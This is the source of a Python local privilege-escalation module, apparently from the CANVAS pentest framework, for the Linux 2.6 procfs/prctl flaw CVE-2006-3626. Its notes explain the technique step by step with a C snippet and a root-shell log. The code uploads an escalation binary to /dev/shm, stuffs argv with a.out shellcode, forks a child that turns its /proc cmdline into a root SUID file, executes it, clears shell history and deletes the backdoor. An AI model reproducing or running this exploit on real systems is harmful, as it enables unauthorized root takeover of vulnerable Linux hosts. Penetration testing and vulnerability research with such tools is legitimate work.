#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2005
#http://www.immunityinc.com/CANVAS/ for more information

import sys
#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from ExploitTypes.localexploit import LocalExploit


TODO = """
"""

NAME="PROCFS"
DESCRIPTION="PROC FS Linux 2.6.x local root exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="Linux"
DOCUMENTATION["Date public"]=""
DOCUMENTATION["CVE Name"] = "CVE-2006-3626"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-3626"
DOCUMENTATION['CVSS'] = 6.2
VERSION="1.0"

PROPERTY={}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Local"
#                              only proc supported by MOSDEFlibc
PROPERTY['ARCH'] = [ ["Linux", "_all", "i386", "sparc", "ppc", "mips", "_parisc", "_arm"] ]
PROPERTY['VERSION'] = [ ] 
PROPERTY["KERNELVER"] = ["2.6.0", "2.6.17.5"]

NOTES=""" 
2.6 kernel prctl vs. proc fs local root
=======================================


1. the 2.6 proc fs can get it's ownership on files dynamically
   adjusted. This can happen in various ways..most notably:

   - by calling prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
   - or by execve'ing a suid root binary

2. the proc fs however, does not adjust existing file permissions when
   changing the ownership on files. This is the bug primitive.

3. this is exploitable in various ways, the most straightforward being:

   A) set the argv or envp for a process to be a binary executable
   that contains instructions you desire to have executed
   (e.g. setuid(0); execve("/bin/sh" ...))

   B) this executable will end up in /proc/self/cmdline|environ respectively.

   C) then proceed to fork a child process.

   D) have the child set 04755 on the /proc/self/target file.

   E) elevate the ownership of the /proc/self/target file to root:root in
   the child process through prctl or a suid root binary execve.

   F) you now essentially have a suid root executable in either
   /proc/childpid/cmdline or /proc/childpid/environ.

4. restrictions: argv and envp are limited in size, this forces you
   to revert to a small binary format, such as a.out. The exploit that
   was posted to FD does just that.

   UPDATE - on why the a.out binary format is used:

   Additionally, the a.out binary format has a fallback mode for when
   mmaping a binary fails. It falls back to read_exec. This was to ensure
   compatibility with fs's that you can not mmap on (DOS f.ex).

   Because the proc fs files can not be mmapped by the elf interpreter, you
   are stuck with binary formats that do not require an mmap to get to the
   entry point of the binary.

   So this limits you to interpreters that can work based of of a straight
   read(2), such as suid perl on a script...or a.out.

   Using environ tends to be somewhat unreliable in that environ tends
   to not always be mapped(readable) when you expect it to be. This results in
   having to do cumbersome mmap-ing to get your timing down.

   Exploiting elegantly:

   A more elegant approach is to use /proc/self/cmdline, and a simple call to
   prctl in the child process to trigger a root:root file ownership change.

   Example code snippet:

   ...

   pid = fork();
   // child actions
   if (!pid)
   {
      // get suid privs
      chmod("/proc/self/"TARGET, 04777);
      // prctl causes file ownership of root:root in /proc
      prctl (PR_SET_DUMPABLE, 0, 0, 0, 0);
      // give parent time to exploit/execute /proc/childpid/target
      sleep(30);
   }

   ...

   That gives you a root owned suid file that contains data that you
   control. From this point on exploitation becomes trivial (there are still
   some minor details, such as waiting for the file ownership to change, and
   making sure the argv was actually mapped to /proc/childpid/cmdline):

   ...

   bas@debian:~$ time ./prctl_vs_proc
   sh-2.05b# exit
   exit

   real    0m0.591s
   user    0m0.003s
   sys     0m0.013s
   bas@debian:~$


References:
===========

1) http://lists.grok.org.uk/pipermail/full-disclosure/2006-July/047907.html


MOSDEF PoC:
===========

Linux/MOSDEF$ runmodule PROCFS -t127.0.0.1
[C] Running module: PROCFS

[C] Args: -t127.0.0.1

Loading PROCFS ...                                                       [ ok ]
WARNING: broken malloc()
WARNING: broken free()
[C] Escale 666 ELF size: 2771
[C] Placing Escale 666 ELF on remote host ...
[C] /dev/shm/0wn3d opened as fd=5
[C] file wrote successfully
[C] a.out binary has 54 strings
[C] trying to execve /dev/shm/0wn3d for the cmdline a.out stuffing ...

...

[C] file ownership succesfully changed to root :)
[C] waiting for file to become readable ...
[C] file is readable, root owned, and SUID ... hooray
[C] trying to fork/execve /proc/3964/cmdline ...
[C] trying to execve /dev/shm/0wn3d for the gold!

...

[C] backdoor file removed :)
[C] \o/ r00t \o/
[C] UID=0 EUID=0 GID=0 EGID=0
Linux/MOSDEF# 

"""

class theexploit(LocalExploit):
    def __init__(self):
        LocalExploit.__init__(self)
        self.name = NAME

    def getargs(self):
        self.user = self.argsDict.get("user", self.user)
        return

    def vulnCheck(self, node):
        """ check if a node is likely to be vuln based on kernel version """

        vuln_start, vuln_end = PROPERTY['KERNELVER']
        ##Rich mod
        vuln_start=vuln_start[0]
        vuln_end=vuln_end[0]

        vuln_major = vuln_start.split('.')[0]
        vuln_minor = vuln_start.split('.')[1]

        vuln_bottom = vuln_start.split('.')[2]
        vuln_top = vuln_end.split('.')[2]

        if '-' in vuln_bottom:
            vuln_bottom = vuln_bottom.split('-')[0]
        if '-' in vuln_top:
            vuln_top = vuln_top.split('-')[0]

        self.log("[!] checking for vuln kernel version (%s to %s)" % (vuln_bottom, vuln_top))

        # adams syscall uname stuff
        uname = node.shell.uname()

        self.log("[!] target kernel: %s %s" % (uname['release'], uname['version']))
 
        tgt_major = uname['release'].split('.')[0]
        tgt_minor = uname['release'].split('.')[1]
        tgt_level = uname['release'].split('.')[2]

        if '-' in tgt_level:
            tgt_level = int(tgt_level.split('-')[0])
        else:
            tgt_level = int(tgt_level)

        if tgt_level in range(int(vuln_bottom), int(vuln_top) + 1):
            self.log("[!] target is likely vulnerable :)")
            return 1
        
        self.log("[!] target does not appear vulnerable :(")
        return 0
    
    def forkRootChild(self, node):
        """ forks a child process with a SUID root /proc/self/cmdline """

        vars = {}
        #vars['PR_SET_DUMPABLE'] = node.shell.libc.getdefine('PR_SET_DUMPABLE')

        code = """
        #import "local", "fork" as "fork"
        #import "local", "prctl" as "prctl"
        #import "local", "chmod" as "chmod"
        #import "local", "nanosleep" as "nanosleep"
        
        #import "local", "sendint" as "sendint"
        
        // #import "int", "PR_SET_DUMPABLE" as "PR_SET_DUMPABLE"
        
        struct timeval {
            int tv_sec;
            int tv_usec;
        };
                                                
        int 
        main(void) 
        {
            struct timeval tv;
            int pid;
            
            pid = fork();
            if (pid)
            {
                sendint(pid);
            }
            else
            {
                // get suid privs on /proc/self/cmdline
                chmod("/proc/self/cmdline", 04777);
                // get root ownership via prctl on file
                prctl(PR_SET_DUMPABLE, 0, 0, 0, 0);
                // sleep to give time to exploit
                tv.tv_sec = 60;
                tv.tv_usec = 0;
                nanosleep(&tv, 0);
            }    
        }      
        """
        # ret is PID of root child
        return node.shell.runCode(code, vars)

    def placeEscaleBinary(self, node, filename):
        """ creates and uploads our mosdef priv escalation binary """

        code = file("backdoors/mosdef_escale_666.c").read()

        vars = {}
        vars['SOCK'] = int(node.shell.fd)
        vars['FILENAME'] = filename

        node.shell.clearfunctioncache()
        bincode = node.shell.compile(code, vars)
        from MOSDEF.makeexe import makelinuxexe
        binexe = makelinuxexe(bincode, proc=node.shell.arch.upper())
        self.log("Escale 666 ELF size: %d" % len(bincode))

        self.log("Placing Escale 666 ELF on remote host ...")
        O_RDWR = node.shell.libc.getdefine('O_RDWR')
        O_CREAT = node.shell.libc.getdefine('O_CREAT')
        node.shell.unlink(filename)
        fd = node.shell.open(filename, O_RDWR|O_CREAT, 0777)
        if fd < 0:
            self.log("couldn't open %s..." % filename)
            return 0
        self.log("%s opened as fd=%d" % (filename, fd))
        r = node.shell.write(fd, binexe)
        if r != 1:
            self.log("write failed.")
            return 0
        self.log("file wrote successfully")
        r = node.shell.close(fd);
        if r == -1:
            self.log("error while trying to close the fd")

        return r

    # we want an a.out that chowns and chmods /dev/shm/0wn3d
    def modArgv(self, node):
        """ modifies the existing argv of the MOSDEF process with a.out binary """

        AOUT = []
        AOUT += [ "\x08\x01\x64\x00" ]
        AOUT += [ "\x3A\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\xA6\xFF\xFF\xFF\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x31\xC0\x31\xDB\xB0\x17\xCD\x80\x68\x33\x64\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x68\x2F\x30\x77\x6E\x68\x2F\x73\x68\x6D\x68\x2F\x64" \
                  "\x65\x76\x89\xE3\x31\xC9\x31\xD2\x31\xC0\xB0\xB6\xCD" \
                  "\x80\x31\xC0\x66\xB9\xFF\x09\xB0\x0F\xCD\x80\x31\xC0" \
                  "\x31\xDB\xB0\x01\xCD\x80\x00" ]
        AOUT += [ "\x08\x01\x64\x00" ]
        AOUT += [ "\x3A\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\xA6\xFF\xFF\xFF\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x31\xC0\x31\xDB\xB0\x17\xCD\x80\x68\x33\x64\x00" ]
        AOUT += [ "\x00" ]
        AOUT += [ "\x68\x2F\x30\x77\x6E\x68\x2F\x73\x68\x6D\x68\x2F\x64" \
                  "\x65\x76\x89\xE3\x31\xC9\x31\xD2\x31\xC0\xB0\xB6\xCD" \
                  "\x80\x31\xC0\x66\xB9\xFF\x09\xB0\x0F\xCD\x80\x31\xC0" \
                  "\x31\xDB\xB0\x01\xCD\x80\x00" ]

        self.log("a.out binary has %d strings" % len(AOUT))

        # now reexec self to have a cmdline loaded with the AOUT :) /dev/shm/0wn3d
        # has already been placed

        self.log("trying to execve /dev/shm/0wn3d for the cmdline a.out stuffing ...")
        r = node.shell.execve("/dev/shm/0wn3d", AOUT, [], 0) 

        # reinit the node
        node.shell.restart()
        
        return r

    def waitRootChild(self, node, pid):
        """ waits for ownership on a file to change to root """
        import time
        
        waittime = 20
        maxtry = 24 * 3600 / waittime

        # XXX: avoid massive stalls .. 100 secs should be enough
        maxtry = 5

        S_ISUID = 0x800

        for i in range(0, maxtry):
            ret, st = node.shell.stat("/proc/%d/cmdline" % pid)
            if ret == -1 or st == None:
                self.log("error trying to stat ...")
                return 0
            if st['st_mode'] & S_ISUID and st['st_uid'] == 0:
                break
            self.log("waiting %dsec... (%d)" % (waittime, i))
            time.sleep(waittime)
        if i == maxtry:
            self.log("max try reached ... no luck")
            return 0

        self.log("file ownership succesfully changed to root :)")

        self.log("waiting for file to become readable ...")
        filename = "/proc/%d/cmdline" % pid        
        O_RDONLY = node.shell.libc.getdefine('O_RDONLY')
        fd = node.shell.open(filename, O_RDONLY, 0);
        if fd < 0:
            self.log("couldn't open %s ..." % filename)
            return 0

        vars = {}
        vars['fd'] = fd

        code = """
        #import "local", "read" as "read"
        #import "local", "sendint" as "sendint"

        #import "int", "fd" as "fd"

        int main(void)
        {
            char c;
            int r;
 
            r = read(fd, &c, 1);
 
            sendint(r);
        }
        """
        while node.shell.runCode(code, vars) != 1:
            self.log("still waiting for file to become readable")            

        self.log("file is readable, root owned, and SUID ... hooray")
        return 1

    def ownProcfs(self, node):
        """ exploit step through """

        # step 0: place our escalation binary
        self.placeEscaleBinary(node, "/dev/shm/0wn3d")        
        
        # step 1: mod the argv
        self.modArgv(node)

        # step 2: fork the root child
        pid = self.forkRootChild(node)

        # step 3: wait for root child voodoo
        r = self.waitRootChild(node, pid)
        if not r:
            self.log("Some error in waitRootChild :(")
            return 0
        
        # step 4: execve root child cmdline ... this will set root:root 04777 on escale bin
        self.log("trying to fork/execve /proc/%d/cmdline ..." % pid)
        r = node.shell.execve("/proc/%d/cmdline" % pid, ["/proc/%d/cmdline" % pid], [], 1)

        import time; time.sleep(1.5)

        # step 5: execve our escale binary to become r00t
        self.log("trying to execve /dev/shm/0wn3d for the gold!")
        r = node.shell.execve("/dev/shm/0wn3d", ["mos'def!"], ["HISTFILE=/dev/null"]) 
        
        # reinit the node
        node.shell.restart()

        # clean up
        r = node.shell.unlink("/dev/shm/0wn3d")
        if r == -1:
            self.log("could'nt remove backdoor file :(")
        else:
            self.log("backdoor file removed :)")

        # woooo
        self.log("\\o/ r00t \\o/"); self.setSucceeded()
        self.log(node.shell.getids())

        return node
        
    def run(self):
        """ This run happens on all nodes selected """
        self.setInfo("%s (in progress)" % (NAME))
        self.getargs()
        for node in self.argsDict["passednodes"]:            
            type = node.nodetype
            nodename = node.getname()
            caps = node.capabilities

            if "linux" not in caps:
                self.log("Node %s not a Linux node..." % nodename)
                continue
            else:
                if not self.vulnCheck(node):
                    continue

                result = self.ownProcfs(node)
                if not result:
                    continue
                return result
            
        self.setInfo("%s (finished)" % (NAME))
        return 0

if __name__=="__main__":
    print "This module is meant to be run only within CANVAS"
    
